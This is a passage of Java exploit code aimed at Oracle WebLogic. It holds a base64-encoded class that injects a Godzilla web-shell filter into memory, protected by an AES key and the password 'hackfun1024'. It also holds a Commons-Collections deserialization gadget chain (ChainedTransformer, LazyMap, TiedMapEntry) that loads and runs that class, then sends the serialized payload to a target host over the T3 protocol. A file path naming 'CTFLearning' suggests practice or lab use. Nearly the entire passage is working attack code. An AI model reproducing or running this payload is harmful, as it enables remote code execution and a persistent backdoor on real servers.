mlhYmxlVHlwZVRhYmxlAQBCTGphdmEvdXRpbC9MaXN0PEx3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1dlYkFwcFNlcnZsZXRDb250ZXh0Oz47BwF0BwGHBwFhBwGIBwDfBwGJBwGKBwFsBwGLAQAJdHJhbnNmb3JtAQBxKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcBjAEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAxhZGRQYXJhbWV0ZXIBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABG5hbWUBAAlidWlsZEtleXMBAKcoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyO0kpVgEABHJvb3QBABFhZGRBdXhpbGlhcnlDbGFzcwEAFChMamF2YS9sYW5nL0NsYXNzOylWAQAIYXV4Q2xhc3MBABFnZXRBdXhpbGlhcnlDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAljbGFzc05hbWUBAA1nZXROYW1lc0FycmF5AQAVKClbTGphdmEvbGFuZy9TdHJpbmc7AQAMZ2V0VXJpc0FycmF5AQANZ2V0VHlwZXNBcnJheQEABCgpW0kBABFnZXROYW1lc3BhY2VBcnJheQEAFW92ZXJyaWRlRGVmYXVsdFBhcnNlcgEAAygpWgEAGHNldE92ZXJyaWRlRGVmYXVsdFBhcnNlcgEABChaKVYBAARmbGFnAQAKU291cmNlRmlsZQEAIkluamVjdFdlYmxvZ2ljR29kemlsbGE0RmlsdGVyLmphdmEMAHIAcwwAcgB5DAGNAY4BAANBRVMHAYAMAY8BkAEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMBABAzYzZlMGI4YTljMTUyMjRhDAGRAZIMAHIBkwwAnwGUDAGVAZYBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADTUQ1BwGXDAGPAZgMAZkBmgwBmwGcAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAZ0BkgwAcgGeDAGfAaAMAaEBogEAEGphdmEudXRpbC5CYXNlNjQMAaMBBgEACmdldEVuY29kZXIMAaQBpQcBhwwBpgGnDAGoAakBAA5lbmNvZGVUb1N0cmluZwEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQAWc3VuLm1pc2MuQkFTRTY0RW5jb2RlcgwBqgGrAQAGZW5jb2RlAQAKZ2V0RGVjb2RlcgEABmRlY29kZQEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIBAAxkZWNvZGVCdWZmZXIBAAtoYWNrZnVuMTAyNAEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAGsAa0MAZ8BogwAjQCOAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlDAGuAa8MAbAAjgwAnACdDACAAIEBAAdwYXlsb2FkBwGFDAGxAbIBAB1JbmplY3RXZWJsb2dpY0dvZHppbGxhNEZpbHRlcgwBswG0DAB8AH0MAbUBtgEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBtwG4DAG5AboMAbsBvAcBvQwBvgG/DAHAAZIMAJMAlAwBuwGgBwGEDACkAcEMAcIAcwEAHndlYmxvZ2ljLnQzLnNydnIuU2VydmVyUnVudGltZQEABnRoZU9uZQwBwwGlDAHEAREBAB53ZWJsb2dpYy90My9zcnZyL1NlcnZlclJ1bnRpbWUBABNqYXZhL3V0aWwvQXJyYXlMaXN0DAHFAcYHAYkMAccBogEAEGJlYV93bHNfaW50ZXJuYWwMAcgBqQEACGNoaWxkcmVuDAHJAcoHAYoMANcBywEAEWphdmEvdXRpbC9IYXNoU2V0DAD6AcwHAYsMAc0BDwwBzgGrDAHPAaIBADB3ZWJsb2dpYy5zZXJ2bGV0LmludGVybmFsLldlYkFwcFJ1bnRpbWVNQmVhbkltcGwBAAdjb250ZXh0AQAud2VibG9naWMvc2VydmxldC9pbnRlcm5hbC9XZWJBcHBTZXJ2bGV0Q29udGV4dAcBiAwB0AG4AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAJanNwRmlsdGVyAQANamF2YS91dGlsL01hcAEABHRlc3QBAAIvKgEADmdldFJvb3RUZW1wRGlyAQAMamF2YS9pby9GaWxlAQAUamF2YXgvc2VydmxldC9GaWx0ZXIBADBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXQBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAA5qYXZhL3V0aWwvTGlzdAEAM3dlYmxvZ2ljL21hbmFnZW1lbnQvcnVudGltZS9BcHBsaWNhdGlvblJ1bnRpbWVNQmVhbgEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQASamF2YS91dGlsL0l0ZXJhdG9yAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAIdG9TdHJpbmcBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAHZm9yTmFtZQEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAAxnZXRQYXJhbWV0ZXIBAAxnZXRBdHRyaWJ1dGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEADHNldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAC3RvQnl0ZUFycmF5AQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEAD3ByaW50U3RhY2tUcmFjZQEAEWdldERlY2xhcmVkTWV0aG9kAQANc2V0QWNjZXNzaWJsZQEAFmdldEFwcGxpY2F0aW9uUnVudGltZXMBADgoKVtMd2VibG9naWMvbWFuYWdlbWVudC9ydW50aW1lL0FwcGxpY2F0aW9uUnVudGltZU1CZWFuOwEAEmdldEFwcGxpY2F0aW9uTmFtZQEADWdldFN1cGVyY2xhc3MBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABYoK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");
        Transformer[] transformers = new Transformer[]{new ConstantTransformer(ClasspathClassLoader.class), new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}), new InvokerTransformer("defineCodeGenClass", new Class[]{String.class, byte[].class, URL.class}, new Object[]{className, clsData, null}), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{null}}), new ConstantTransformer(new HashSet())};
        ChainedTransformer inertChain = new ChainedTransformer(new Transformer[0]);
        HashMap<String, String> innerMap = new HashMap();
        Map m = LazyMap.decorate(innerMap, inertChain);
        Map outerMap = new HashMap();
        TiedMapEntry tied = new TiedMapEntry(m, "v");
        outerMap.put(tied, "t");
        innerMap.remove("v");
        Field field = inertChain.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(inertChain, transformers);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(outerMap);
        objOut.flush();
        objOut.close();
        byte[] payload = out.toByteArray();
        T3ProtocolOperation.send(host, port, payload);
    }
    public static void tobytes() throws FileNotFoundException {
            String jarname ="E:\\CTFLearning\\WeblogicEnvironment-master\\weblogic_cmd-master\\weblogic_cmd-master\\out\\production\\weblogic_cmd\\com\\boogipop\\payload\\RemoteImpl.class";
            InputStream is = new FileInputStream(jarname);

            ByteArrayOutputStream bytestream = new ByteArrayOutputStream();
            int ch;
            byte imgdata[] = null;
            try {
                while ((ch = is.read()) != -1) {
                    bytestream.write(ch);
                }
                imgdata = bytestream.toByteArray();
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                try {
                    bytestream.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            System.out.println(Arrays.toString(imgdata));
    }
}
